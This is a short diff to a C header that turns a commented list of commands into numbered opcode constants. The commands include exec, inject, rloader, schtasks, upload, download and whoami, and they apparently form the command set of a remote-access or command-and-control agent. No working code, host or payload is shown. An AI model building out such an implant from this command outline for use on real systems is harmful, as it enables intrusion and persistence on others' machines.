@@ -6,20 +6,21 @@
 #define OPCODE_CLEAR 6 // clear
 #define OPCODE_DOWNLOAD 7 // download
 #define OPCODE_ECHO 8 // echo
-/**# exec
-# exit
-# help
-# httpcl
-# include
-# inject
-# ls
-# pkill
-# ps
-# pwd
-# readf
-# rloader
-# rm
-# schtasks
-# sha256sum
-# sleep
-# upload**/
+#define OPCODE_EXEC 9
+#define OPCODE_EXIT 10
+#define OPCODE_HELP 11
+#define OPCODE_HTTPCL 12
+#define OPCODE_INCLUDE 13
+#define OPCODE_INJECT 14
+#define OPCODE_LS 15
+#define OPCODE_PKILL 16
+#define OPCODE_PS 17
+#define OPCODE_PWD 18
+#define OPCODE_READF 19 
+#define OPCODE_RLOADER 20
+#define OPCODE_RM 21
+#define OPCODE_SCHTASKS 22
+#define OPCODE_SHA256SUM 23
+#define OPCODE_SLEEP 24
+#define OPCODE_UPLOAD 25
+#define OPCODE_WHOAMI 26
